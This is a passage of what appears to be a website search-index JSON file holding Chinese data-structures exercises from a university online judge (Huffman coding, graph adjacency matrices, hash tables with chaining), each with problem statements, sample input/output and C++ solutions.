\u7ed9\u5b9an\u4e2a\u5b57\u7b26\u53ca\u5176\u5bf9\u5e94\u7684\u6743\u503c\uff0c\u6784\u9020Huffman\u6811\uff0c\u5e76\u8fdb\u884chuffman\u7f16\u7801\u548c\u8bd1\uff08\u89e3\uff09\u7801\u3002 \u6784\u9020Huffman\u6811\u65f6\uff0c\u8981\u6c42\u5de6\u5b50\u6811\u6839\u7684\u6743\u503c\u5c0f\u4e8e\u3001\u7b49\u4e8e\u53f3\u5b50\u6811\u6839\u7684\u6743\u503c\u3002 \u8fdb\u884cHuffman\u7f16\u7801\u65f6\uff0c\u5047\u5b9aHuffman\u6811\u7684\u5de6\u5206\u652f\u4e0a\u7f16\u7801\u4e3a\u20180\u2019\uff0c\u53f3\u5206\u652f\u4e0a\u7f16\u7801\u4e3a\u20181\u2019\u3002 2\u3001\u7b97\u6cd5 \u6784\u9020Huffman\u6811\u7b97\u6cd5\uff1a \u2474 \u6839\u636e\u7ed9\u5b9a\u7684n\u4e2a\u6743\u503c(w1, w2, \u2026, wn)\u6784\u6210n\u68f5\u4e8c\u53c9\u6811\u7684\u96c6\u5408F={T1, T2, \u2026, Tn}\uff0c\u5176\u4e2d\u6bcf\u68f5\u4e8c\u53c9\u6811Ti\u4e2d\u53ea\u6709\u4e00\u4e2a\u6743\u503c\u4e3awi\u7684\u6839\u7ed3\u70b9\u3002 \u2475 \u5728F\u4e2d\u9009\u53d6\u4e24\u68f5\u6839\u7ed3\u70b9\u7684\u6743\u503c\u6700\u5c0f\u7684\u6811\uff0c\u4f5c\u4e3a\u5de6\u3001\u53f3\u5b50\u6811\u6784\u9020\u4e00\u68f5\u65b0\u7684\u4e8c\u53c9\u6811\uff0c\u4e14\u7f6e\u5176\u6839\u7ed3\u70b9\u7684\u6743\u503c\u4e3a\u5176\u5de6\u3001\u53f3\u5b50\u6811\u6743\u503c\u4e4b\u548c\u3002 \u2476 \u5728F\u4e2d\u5220\u9664\u8fd9\u4e24\u68f5\u6811\uff0c\u540c\u65f6\u5c06\u65b0\u5f97\u5230\u7684\u4e8c\u53c9\u6811\u52a0\u5165F\u4e2d\u3002 (4) \u91cd\u590d\u2475, \u2476\uff0c\u76f4\u5230F\u53ea\u542b\u4e00\u68f5\u6811\u4e3a\u6b62\u3002 3\u3001Huffman\u7f16\u7801\u7b97\u6cd5\uff1a \u2474 \u4eceHuffman\u6811\u7684\u6bcf\u4e00\u4e2a\u53f6\u5b50\u7ed3\u70b9\u5f00\u59cb\u3002 \u2475 \u4f9d\u6b21\u6cbf\u7ed3\u70b9\u5230\u6839\u7684\u8def\u5f84\uff0c\u5224\u65ad\u8be5\u7ed3\u70b9\u662f\u7236\u4eb2\u7ed3\u70b9\u7684\u5de6\u5b69\u5b50\u8fd8\u662f\u53f3\u5b69\u5b50\uff0c\u5982\u679c\u662f\u5de6\u5b69\u5b50\u5219\u5f97\u5230\u7f16\u7801\u20180\u2019\uff0c\u5426\u5219\u5f97\u5230\u7f16\u7801\u20181\u2019\uff0c\u5148\u5f97\u5230\u7684\u7f16\u7801\u653e\u5728\u540e\u9762\u3002 \u2476 \u76f4\u5230\u5230\u8fbe\u6839\u7ed3\u70b9\uff0c\u7f16\u7801\u5e8f\u5217\u5373\u4e3a\u8be5\u53f6\u5b50\u7ed3\u70b9\u5bf9\u5e94\u7684Huffman\u7f16\u7801\u3002 4\u3001Huffman\u8bd1\uff08\u89e3\uff09\u7801\u7b97\u6cd5\uff1a \u2474 \u6307\u9488\u6307\u5411Huffman\u6811\u7684\u6839\u7ed3\u70b9\uff0c\u53d6\u7b2c\u4e00\u4e2aHuffman\u7801\u3002 \u2475 \u5982\u679cHuffman\u7801\u4e3a\u20180\u2019\uff0c\u5c06\u6307\u9488\u6307\u5411\u5f53\u524d\u7ed3\u70b9\u7684\u5de6\u5b50\u6811\u7684\u6839\u7ed3\u70b9\uff1b\u5982\u679cHuffman\u7801\u4e3a\u20181\u2019\uff0c\u5c06\u6307\u9488\u6307\u5411\u5f53\u524d\u7ed3\u70b9\u7684\u53f3\u5b50\u6811\u7684\u6839\u7ed3\u70b9\u3002 \u2476 \u5982\u679c\u6307\u9488\u6307\u5411\u7684\u5f53\u524d\u7ed3\u70b9\u4e3a\u53f6\u5b50\u7ed3\u70b9\uff0c\u5219\u8f93\u51fa\u53f6\u5b50\u7ed3\u70b9\u5bf9\u5e94\u7684\u5b57\u7b26\uff1b\u5426\u5219\uff0c\u53d6\u4e0b\u4e00\u4e2aHuffman\u7801\uff0c\u5e76\u8fd4\u56de\u2475\u3002 \u2477 \u5982\u679cHuffman\u7801\u5e8f\u5217\u672a\u7ed3\u675f\uff0c\u5219\u8fd4\u56de\u2474\u7ee7\u7eed\u8bd1\u7801\u3002","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"szu_oj/ds/1250/#_2","text":"\u7b2c\u4e00\u884c\u6d4b\u8bd5\u6b21\u6570 \u7b2c2\u884c\uff1a\u7b2c\u4e00\u7ec4\u6d4b\u8bd5\u6570\u636e\u7684\u5b57\u7b26\u4e2a\u6570n\uff0c\u540e\u8ddfn\u4e2a\u5b57\u7b26 \u7b2c3\u884c\uff1a\u7b2c\u4e00\u7ec4\u6d4b\u8bd5\u6570\u636e\u7684\u5b57\u7b26\u6743\u91cd \u5f85\u7f16\u7801\u7684\u5b57\u7b26\u4e32s1 \u7f16\u7801\u4e32s2 \u5176\u5b83\u7ec4\u6d4b\u8bd5\u6570\u636e\u7c7b\u63a8","title":"\u8f93\u5165"},{"location":"szu_oj/ds/1250/#_3","text":"\u7b2c\u4e00\u884c~\u7b2cn\u884c,\u7b2c\u4e00\u7ec4\u6d4b\u8bd5\u6570\u636e\u5404\u5b57\u7b26\u7f16\u7801\u503c \u7b2cn+1\u884c\uff0c\u4e32s1\u7684\u7f16\u7801\u503c \u7b2cn+2\u884c\uff0c\u4e32s2\u7684\u89e3\u7801\u503c\uff0c\u82e5\u89e3\u7801\u4e0d\u6210\u529f\uff0c\u8f93\u51faerror! \u5176\u5b83\u7ec4\u6d4b\u8bd5\u6570\u636e\u7c7b\u63a8","title":"\u8f93\u51fa"},{"location":"szu_oj/ds/1250/#_4","text":"1 2 3 4 5 6 7 8 9 2 5 A B C D E 15 4 4 3 2 ABDEC 00000101100 4 A B C D 7 5 2 4 ABAD 1110110","title":"\u6837\u4f8b\u8f93\u5165"},{"location":"szu_oj/ds/1250/#_5","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 A : 1 B : 010 C : 011 D : 001 E : 000 1010001000011 error ! A : 0 B : 10 C : 110 D : 111 0100111 DAC","title":"\u6837\u4f8b\u8f93\u51fa"},{"location":"szu_oj/ds/1250/#_6","text":"","title":"\u63d0\u793a"},{"location":"szu_oj/ds/1250/#_7","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 #include <iostream> #include <string> #include <vector> #include <algorithm> struct Node { char data ; int freq ; std :: string pattern ; Node * left , * right ; Node () : data ( 0 ), freq ( 0 ), left ( NULL ), right ( NULL ) {} Node ( const char data , const int freq ) : data ( data ), freq ( freq ), left ( NULL ), right ( NULL ) {} }; bool compare ( const Node * lhs , const Node * rhs ) { return lhs -> freq < rhs -> freq ; } class Huffman { public : explicit Huffman ( std :: vector < Node *> & elements ) { std :: vector < Node *> elements_ ; elements_ . assign ( elements . begin (), elements . end ()); this -> elements_ = elements ; while ( elements_ . size () != 1 ) { std :: sort ( elements_ . begin (), elements_ . end (), compare ); Node * leftChild = elements_ . front (); elements_ . erase ( elements_ . begin ()); Node * rightChild = elements_ . front (); elements_ . erase ( elements_ . begin ()); Node * node = new Node ( 0 , leftChild -> freq + rightChild -> freq ); node -> left = leftChild ; node -> right = rightChild ; elements_ . push_back ( node ); } root_ = elements_ . front (); std :: string pattern ; generate ( root_ , pattern ); for ( int i = 0 ; i < this -> elements_ . size (); ++ i ) { std :: cout << this -> elements_ [ i ] -> data << \" :\" << this -> elements_ [ i ] -> pattern << std :: endl ; } } void encode ( const std :: string & string ) { std :: string encode ; for ( int i1 = 0 ; i1 < string . length (); ++ i1 ) { for ( int i2 = 0 ; i2 < elements_ . size (); ++ i2 ) { if ( elements_ [ i2 ] -> data == string [ i1 ]) { encode += elements_ [ i2 ] -> pattern ; } } } std :: cout << encode << std :: endl ; } void decode ( const std :: string & string ) { std :: string decode ; Node * ptr = root_ ; for ( int i1 = 0 ; i1 < string . size (); ++ i1 ) { if ( string [ i1 ] == '0' ) { ptr = ptr -> left ; } else { ptr = ptr -> right ; } if ( ptr == NULL ) { std :: cout << \"error!\" << std :: endl ; return ; } else if ( ptr -> data != 0 ) { decode . push_back ( ptr -> data ); ptr = root_ ; } } if ( ptr == root_ ) { std :: cout << decode << std :: endl ; } else { std :: cout << \"error!\" << std :: endl ; } } private : Node * root_ ; std :: vector < Node *> elements_ ; void generate ( Node * node , std :: string & pattern ) { if ( node ) { if ( node -> data != 0 ) { node -> pattern . assign ( pattern ); } pattern . push_back ( '0' ); generate ( node -> left , pattern ); pattern . erase ( pattern . end () - 1 ); pattern . push_back ( '1' ); generate ( node -> right , pattern ); pattern . erase ( pattern . end () - 1 ); } } }; int main () { int ctrl ; std :: cin >> ctrl ; while ( ctrl -- ) { int size ; std :: cin >> size ; std :: vector < Node *> elements ( size ); for ( int i = 0 ; i < size ; ++ i ) { elements [ i ] = new Node (); std :: cin >> elements [ i ] -> data ; } for ( int i = 0 ; i < size ; ++ i ) { std :: cin >> elements [ i ] -> freq ; } class Huffman huffman ( elements ); std :: string string ; std :: cin >> string ; huffman . encode ( string ); std :: cin >> string ; huffman . decode ( string ); } return 0 ; }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"szu_oj/ds/1253/","text":"DS\u56fe\u2014\u56fe\u7684\u90bb\u63a5\u77e9\u9635\u5b58\u50a8\u53ca\u5ea6\u8ba1\u7b97 \u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB \u9898\u76ee\u63cf\u8ff0 \u5047\u8bbe\u56fe\u7528\u90bb\u63a5\u77e9\u9635\u5b58\u50a8\u3002\u8f93\u5165\u56fe\u7684\u9876\u70b9\u4fe1\u606f\u548c\u8fb9\u4fe1\u606f\uff0c\u5b8c\u6210\u90bb\u63a5\u77e9\u9635\u7684\u8bbe\u7f6e\uff0c\u5e76\u8ba1\u7b97\u5404\u9876\u70b9\u7684\u5165\u5ea6\u3001\u51fa\u5ea6\u548c\u5ea6\uff0c\u5e76\u8f93\u51fa\u56fe\u4e2d\u7684\u5b64\u7acb\u70b9\uff08\u5ea6\u4e3a0\u7684\u9876\u70b9\uff09 --\u7a0b\u5e8f\u8981\u6c42-- \u82e5\u4f7f\u7528C++\u53ea\u80fdinclude\u4e00\u4e2a\u5934\u6587\u4ef6iostream\uff1b\u82e5\u4f7f\u7528C\u8bed\u8a00\u53ea\u80fdinclude\u4e00\u4e2a\u5934\u6587\u4ef6stdio \u7a0b\u5e8f\u4e2d\u82e5include\u591a\u8fc7\u4e00\u4e2a\u5934\u6587\u4ef6\uff0c\u4e0d\u770b\u4ee3\u7801\uff0c\u4f5c0\u5206\u5904\u7406 \u4e0d\u5141\u8bb8\u4f7f\u7528\u7b2c\u4e09\u65b9\u5bf9\u8c61\u6216\u51fd\u6570\u5b9e\u73b0\u672c\u9898\u7684\u8981\u6c42 \u8f93\u5165 \u6d4b\u8bd5\u6b21\u6570T\uff0c\u6bcf\u7ec4\u6d4b\u8bd5\u6570\u636e\u683c\u5f0f\u5982\u4e0b\uff1a \u56fe\u7c7b\u578b \u9876\u70b9\u6570 \uff08D\u2014\u6709\u5411\u56fe\uff0cU\u2014\u65e0\u5411\u56fe\uff09 \u9876\u70b9\u4fe1\u606f \u8fb9\u6570 \u6bcf\u884c\u4e00\u6761\u8fb9\uff08\u9876\u70b91 \u9876\u70b92\uff09\u6216\u5f27\uff08\u5f27\u5c3e \u5f27\u5934\uff09\u4fe1\u606f \u8f93\u51fa \u6bcf\u7ec4\u6d4b\u8bd5\u6570\u636e\u8f93\u51fa\u5982\u4e0b\u4fe1\u606f\uff08\u5177\u4f53\u8f93\u51fa\u683c\u5f0f\u89c1\u6837\u4f8b\uff09\uff1a \u56fe\u7684\u90bb\u63a5\u77e9\u9635 \u6309\u9876\u70b9\u4fe1\u606f\u8f93\u51fa\u5404\u9876\u70b9\u7684\u5ea6\uff08\u65e0\u5411\u56fe\uff09\u6216\u5404\u9876\u70b9\u7684\u51fa\u5ea6 \u5165\u5ea6 \u5ea6\uff08\u6709\u5411\u56fe\uff09\u3002\u5b64\u7acb\u70b9\u7684\u5ea6\u4fe1\u606f\u4e0d\u8f93\u51fa\u3002 \u56fe\u7684\u5b64\u7acb\u70b9\u3002\u82e5\u6ca1\u6709\u5b64\u7acb\u70b9\uff0c\u4e0d\u8f93\u51fa\u4efb\u4f55\u4fe1\u606f\u3002 \u6837\u4f8b\u8f93\u5165 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 2 D 5 V1 V2 V3 V4 V5 7 V1 V2 V1 V4 V2 V3 V3 V1 V3 V5 V4 V3 V4 V5 U 5 A B C D E 5 A B A C B D D C A D \u6837\u4f8b\u8f93\u51fa 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 0 1 0 1 0 0 0 1 0 0 1 0 0 0 1 0 0 1 0 1 0 0 0 0 0 V1 : 2 1 3 V2 : 1 1 2 V3 : 2 2 4 V4 : 2 1 3 V5 : 0 2 2 0 1 1 1 0 1 0 0 1 0 1 0 0 1 0 1 1 1 0 0 0 0 0 0 0 A : 3 B : 2 C : 2 D : 3 E \u63d0\u793a \u89e3\u51b3\u65b9\u6848 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 #include <iostream> #include <vector> #include <string> class Map { public : Map ( const char type , const int size ) : type_ ( type ), size_ ( size ), vector_ ( size ), matrix_ ( size , std :: vector < int > ( size , 0 )) {} void setFromCin () { for ( int i = 0 ; i < size_ ; ++ i ) { std :: cin >> vector_ [ i ]; } int size ; std :: cin >> size ; for ( int i = 0 ; i < size ; ++ i ) { setMatFromCin (); } } void printAllDegree () { for ( int ir = 0 ; ir < matrix_ . size (); ++ ir ) { std :: cout << matrix_ [ ir ]. front (); for ( int ic = 1 ; ic < matrix_ . size (); ++ ic ) { std :: cout << ' ' << matrix_ [ ir ][ ic ]; } std :: cout << std :: endl ; } if ( type_ == 'D' ) { for ( int i = 0 ; i < vector_ . size (); ++ i ) { std :: cout << vector_ [ i ]; int inDegree = 0 , outDegree = 0 ; for ( int ir = 0 ; ir < matrix_ . size (); ++ ir ) { if ( matrix_ [ i ][ ir ] == 1 ) { inDegree += 1 ; } } for ( int ic = 0 ; ic < matrix_ . size (); ++ ic ) { if ( matrix_ [ ic ][ i ] == 1 ) { outDegree += 1 ; } } if ( inDegree + outDegree != 0 ) { std :: cout << \": \" << inDegree << ' ' << outDegree << ' ' << inDegree + outDegree << std :: endl ; } } } else if ( type_ == 'U' ) { for ( int i = 0 ; i < vector_ . size (); ++ i ) { std :: cout << vector_ [ i ]; int degree = 0 ; for ( int ir = 0 ; ir < matrix_ . size (); ++ ir ) { if ( matrix_ [ i ][ ir ] == 1 ) { degree += 1 ; } } if ( degree != 0 ) { std :: cout << \": \" << degree << std :: endl ; } } } } private : char type_ ; int size_ ; std :: vector < std :: string > vector_ ; std :: vector < std :: vector < int > > matrix_ ; void setMatFromCin () { std :: string src , dst ; std :: cin >> src >> dst ; for ( int i1 = 0 ; i1 < vector_ . size (); ++ i1 ) { if ( vector_ [ i1 ] == src ) { for ( int i2 = 0 ; i2 < vector_ . size (); ++ i2 ) { if ( vector_ [ i2 ] == dst ) { if ( type_ == 'D' ) { matrix_ [ i1 ][ i2 ] = 1 ; } else if ( type_ = 'U' ) { matrix_ [ i1 ][ i2 ] = 1 ; matrix_ [ i2 ][ i1 ] = 1 ; } return ; } } } } } }; int main () { int ctrl ; std :: cin >> ctrl ; while ( ctrl -- ) { char type ; int size ; std :: cin >> type >> size ; Map map ( type , size ); map . setFromCin (); map . printAllDegree (); } return 0 ; }","title":"DS\u56fe\u2014\u56fe\u7684\u90bb\u63a5\u77e9\u9635\u5b58\u50a8\u53ca\u5ea6\u8ba1\u7b97"},{"location":"szu_oj/ds/1253/#ds","text":"\u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB","title":"DS\u56fe\u2014\u56fe\u7684\u90bb\u63a5\u77e9\u9635\u5b58\u50a8\u53ca\u5ea6\u8ba1\u7b97"},{"location":"szu_oj/ds/1253/#_1","text":"\u5047\u8bbe\u56fe\u7528\u90bb\u63a5\u77e9\u9635\u5b58\u50a8\u3002\u8f93\u5165\u56fe\u7684\u9876\u70b9\u4fe1\u606f\u548c\u8fb9\u4fe1\u606f\uff0c\u5b8c\u6210\u90bb\u63a5\u77e9\u9635\u7684\u8bbe\u7f6e\uff0c\u5e76\u8ba1\u7b97\u5404\u9876\u70b9\u7684\u5165\u5ea6\u3001\u51fa\u5ea6\u548c\u5ea6\uff0c\u5e76\u8f93\u51fa\u56fe\u4e2d\u7684\u5b64\u7acb\u70b9\uff08\u5ea6\u4e3a0\u7684\u9876\u70b9\uff09 --\u7a0b\u5e8f\u8981\u6c42-- \u82e5\u4f7f\u7528C++\u53ea\u80fdinclude\u4e00\u4e2a\u5934\u6587\u4ef6iostream\uff1b\u82e5\u4f7f\u7528C\u8bed\u8a00\u53ea\u80fdinclude\u4e00\u4e2a\u5934\u6587\u4ef6stdio \u7a0b\u5e8f\u4e2d\u82e5include\u591a\u8fc7\u4e00\u4e2a\u5934\u6587\u4ef6\uff0c\u4e0d\u770b\u4ee3\u7801\uff0c\u4f5c0\u5206\u5904\u7406 \u4e0d\u5141\u8bb8\u4f7f\u7528\u7b2c\u4e09\u65b9\u5bf9\u8c61\u6216\u51fd\u6570\u5b9e\u73b0\u672c\u9898\u7684\u8981\u6c42","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"szu_oj/ds/1253/#_2","text":"\u6d4b\u8bd5\u6b21\u6570T\uff0c\u6bcf\u7ec4\u6d4b\u8bd5\u6570\u636e\u683c\u5f0f\u5982\u4e0b\uff1a \u56fe\u7c7b\u578b \u9876\u70b9\u6570 \uff08D\u2014\u6709\u5411\u56fe\uff0cU\u2014\u65e0\u5411\u56fe\uff09 \u9876\u70b9\u4fe1\u606f \u8fb9\u6570 \u6bcf\u884c\u4e00\u6761\u8fb9\uff08\u9876\u70b91 \u9876\u70b92\uff09\u6216\u5f27\uff08\u5f27\u5c3e \u5f27\u5934\uff09\u4fe1\u606f","title":"\u8f93\u5165"},{"location":"szu_oj/ds/1253/#_3","text":"\u6bcf\u7ec4\u6d4b\u8bd5\u6570\u636e\u8f93\u51fa\u5982\u4e0b\u4fe1\u606f\uff08\u5177\u4f53\u8f93\u51fa\u683c\u5f0f\u89c1\u6837\u4f8b\uff09\uff1a \u56fe\u7684\u90bb\u63a5\u77e9\u9635 \u6309\u9876\u70b9\u4fe1\u606f\u8f93\u51fa\u5404\u9876\u70b9\u7684\u5ea6\uff08\u65e0\u5411\u56fe\uff09\u6216\u5404\u9876\u70b9\u7684\u51fa\u5ea6 \u5165\u5ea6 \u5ea6\uff08\u6709\u5411\u56fe\uff09\u3002\u5b64\u7acb\u70b9\u7684\u5ea6\u4fe1\u606f\u4e0d\u8f93\u51fa\u3002 \u56fe\u7684\u5b64\u7acb\u70b9\u3002\u82e5\u6ca1\u6709\u5b64\u7acb\u70b9\uff0c\u4e0d\u8f93\u51fa\u4efb\u4f55\u4fe1\u606f\u3002","title":"\u8f93\u51fa"},{"location":"szu_oj/ds/1253/#_4","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 2 D 5 V1 V2 V3 V4 V5 7 V1 V2 V1 V4 V2 V3 V3 V1 V3 V5 V4 V3 V4 V5 U 5 A B C D E 5 A B A C B D D C A D","title":"\u6837\u4f8b\u8f93\u5165"},{"location":"szu_oj/ds/1253/#_5","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 0 1 0 1 0 0 0 1 0 0 1 0 0 0 1 0 0 1 0 1 0 0 0 0 0 V1 : 2 1 3 V2 : 1 1 2 V3 : 2 2 4 V4 : 2 1 3 V5 : 0 2 2 0 1 1 1 0 1 0 0 1 0 1 0 0 1 0 1 1 1 0 0 0 0 0 0 0 A : 3 B : 2 C : 2 D : 3 E","title":"\u6837\u4f8b\u8f93\u51fa"},{"location":"szu_oj/ds/1253/#_6","text":"","title":"\u63d0\u793a"},{"location":"szu_oj/ds/1253/#_7","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 #include <iostream> #include <vector> #include <string> class Map { public : Map ( const char type , const int size ) : type_ ( type ), size_ ( size ), vector_ ( size ), matrix_ ( size , std :: vector < int > ( size , 0 )) {} void setFromCin () { for ( int i = 0 ; i < size_ ; ++ i ) { std :: cin >> vector_ [ i ]; } int size ; std :: cin >> size ; for ( int i = 0 ; i < size ; ++ i ) { setMatFromCin (); } } void printAllDegree () { for ( int ir = 0 ; ir < matrix_ . size (); ++ ir ) { std :: cout << matrix_ [ ir ]. front (); for ( int ic = 1 ; ic < matrix_ . size (); ++ ic ) { std :: cout << ' ' << matrix_ [ ir ][ ic ]; } std :: cout << std :: endl ; } if ( type_ == 'D' ) { for ( int i = 0 ; i < vector_ . size (); ++ i ) { std :: cout << vector_ [ i ]; int inDegree = 0 , outDegree = 0 ; for ( int ir = 0 ; ir < matrix_ . size (); ++ ir ) { if ( matrix_ [ i ][ ir ] == 1 ) { inDegree += 1 ; } } for ( int ic = 0 ; ic < matrix_ . size (); ++ ic ) { if ( matrix_ [ ic ][ i ] == 1 ) { outDegree += 1 ; } } if ( inDegree + outDegree != 0 ) { std :: cout << \": \" << inDegree << ' ' << outDegree << ' ' << inDegree + outDegree << std :: endl ; } } } else if ( type_ == 'U' ) { for ( int i = 0 ; i < vector_ . size (); ++ i ) { std :: cout << vector_ [ i ]; int degree = 0 ; for ( int ir = 0 ; ir < matrix_ . size (); ++ ir ) { if ( matrix_ [ i ][ ir ] == 1 ) { degree += 1 ; } } if ( degree != 0 ) { std :: cout << \": \" << degree << std :: endl ; } } } } private : char type_ ; int size_ ; std :: vector < std :: string > vector_ ; std :: vector < std :: vector < int > > matrix_ ; void setMatFromCin () { std :: string src , dst ; std :: cin >> src >> dst ; for ( int i1 = 0 ; i1 < vector_ . size (); ++ i1 ) { if ( vector_ [ i1 ] == src ) { for ( int i2 = 0 ; i2 < vector_ . size (); ++ i2 ) { if ( vector_ [ i2 ] == dst ) { if ( type_ == 'D' ) { matrix_ [ i1 ][ i2 ] = 1 ; } else if ( type_ = 'U' ) { matrix_ [ i1 ][ i2 ] = 1 ; matrix_ [ i2 ][ i1 ] = 1 ; } return ; } } } } } }; int main () { int ctrl ; std :: cin >> ctrl ; while ( ctrl -- ) { char type ; int size ; std :: cin >> type >> size ; Map map ( type , size ); map . setFromCin (); map . printAllDegree (); } return 0 ; }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"szu_oj/ds/1260/","text":"\u54c8\u5e0c\u67e5\u627e\u4e0e\u589e\u8865 \u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB \u9898\u76ee\u63cf\u8ff0 \u7ed9\u51fa\u4e00\u4e2a\u6570\u636e\u5e8f\u5217\uff0c\u5efa\u7acb\u54c8\u5e0c\u8868\uff0c\u91c7\u7528\u6c42\u4f59\u6cd5\u4f5c\u4e3a\u54c8\u5e0c\u51fd\u6570\uff0c\u6a21\u6570\u4e3a11\uff0c\u54c8\u5e0c\u51b2\u7a81\u7528\u94fe\u5730\u5740\u6cd5\u548c\u8868\u5c3e\u63d2\u5165 \u5982\u679c\u9996\u6b21\u67e5\u627e\u5931\u8d25\uff0c\u5c31\u628a\u6570\u636e\u63d2\u5165\u5230\u76f8\u5e94\u7684\u4f4d\u7f6e\u4e2d \u5b9e\u73b0\u54c8\u5e0c\u67e5\u627e\u4e0e\u589e\u8865\u529f\u80fd \u8f93\u5165 \u7b2c\u4e00\u884c\u8f93\u5165n\uff0c\u8868\u793a\u6709n\u4e2a\u6570\u636e \u7b2c\u4e8c\u884c\u8f93\u5165n\u4e2a\u6570\u636e\uff0c\u90fd\u662f\u81ea\u7136\u6570\u4e14\u4e92\u4e0d\u76f8\u540c\uff0c\u6570\u636e\u4e4b\u95f4\u7528\u7a7a\u683c\u9694\u5f00 \u7b2c\u4e09\u884c\u8f93\u5165t\uff0c\u8868\u793a\u8981\u67e5\u627et\u4e2a\u6570\u636e \u4ece\u7b2c\u56db\u884c\u8d77\uff0c\u6bcf\u884c\u8f93\u5165\u4e00\u4e2a\u8981\u67e5\u627e\u7684\u6570\u636e\uff0c\u90fd\u662f\u6b63\u6574\u6570 \u8f93\u51fa \u6bcf\u884c\u8f93\u51fa\u5bf9\u5e94\u6570\u636e\u7684\u67e5\u627e\u7ed3\u679c\uff0c\u6bcf\u4e2a\u7ed3\u679c\u8868\u793a\u4e3a\u6570\u636e\u6240\u5728\u4f4d\u7f6e[0\uff0c11\uff09\u548c\u67e5\u627e\u6b21\u6570\uff0c\u4e2d\u95f4\u7528\u7a7a\u683c\u5206\u5f00 \u6837\u4f8b\u8f93\u5165 1 2 3 4 5 6 7 8 9 6 11 23 39 48 75 62 6 39 52 52 63 63 52 \u6837\u4f8b\u8f93\u51fa 1 2 3 4 5 6 6 1 error 8 1 error 8 2 8 1 \u63d0\u793a \u89e3\u51b3\u65b9\u6848 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 #include <iostream> #include <vector> class HashTable { public : HashTable () : hash_ ( P ) {} void insert ( int data ) { int index = data % P ; Node * ptr = & hash_ [ index ]; while ( ptr -> next != NULL ) { ptr = ptr -> next ; } ptr -> next = new Node (); ptr = ptr -> next ; ptr -> data = data ; } void searchOrInsertThenPrint ( int data ) { int result = search ( data ); if ( result == - 1 ) { std :: cout << \"error\" << std :: endl ; insert ( data ); } else { std :: cout << data % P << ' ' << result << std :: endl ; } } int search ( int data ) { int index = data % P ; Node * ptr = & hash_ [ index ]; int count = 0 ; while ( ptr -> next != NULL ) { ptr = ptr -> next ; count += 1 ; if ( ptr -> data == data ) { return count ; } } return - 1 ; } private : static const int P = 11 ; struct Node { int data ; Node * next ; Node () : data (), next ( NULL ) {} }; std :: vector < Node > hash_ ; }; int main () { size_t size ; std :: cin >> size ; class HashTable hashTable ; for ( int i = 0 ; i < size ; ++ i ) { int number ; std :: cin >> number ; hashTable . insert ( number ); } size_t time ; std :: cin >> time ; for ( int i = 0 ; i < time ; ++ i ) { int number ; std :: cin >> number ; hashTable . searchOrInsertThenPrint ( number ); } return 0 ; }","title":"\u54c8\u5e0c\u67e5\u627e\u4e0e\u589e\u8865"},{"location":"szu_oj/ds/1260/#_1","text":"\u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB","title":"\u54c8\u5e0c\u67e5\u627e\u4e0e\u589e\u8865"},{"location":"szu_oj/ds/1260/#_2","text":"\u7ed9\u51fa\u4e00\u4e2a\u6570\u636e\u5e8f\u5217\uff0c\u5efa\u7acb\u54c8\u5e0c\u8868\uff0c\u91c7\u7528\u6c42\u4f59\u6cd5\u4f5c\u4e3a\u54c8\u5e0c\u51fd\u6570\uff0c\u6a21\u6570\u4e3a11\uff0c\u54c8\u5e0c\u51b2\u7a81\u7528\u94fe\u5730\u5740\u6cd5\u548c\u8868\u5c3e\u63d2\u5165 \u5982\u679c\u9996\u6b21\u67e5\u627e\u5931\u8d25\uff0c\u5c31\u628a\u6570\u636e\u63d2\u5165\u5230\u76f8\u5e94\u7684\u4f4d\u7f6e\u4e2d \u5b9e\u73b0\u54c8\u5e0c\u67e5\u627e\u4e0e\u589e\u8865\u529f\u80fd","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"szu_oj/ds/1260/#_3","text":"\u7b2c\u4e00\u884c\u8f93\u5165n\uff0c\u8868\u793a\u6709n\u4e2a\u6570\u636e \u7b2c\u4e8c\u884c\u8f93\u5165n\u4e2a\u6570\u636e\uff0c\u90fd\u662f\u81ea\u7136\u6570\u4e14\u4e92\u4e0d\u76f8\u540c\uff0c\u6570\u636e\u4e4b\u95f4\u7528\u7a7a\u683c\u9694\u5f00 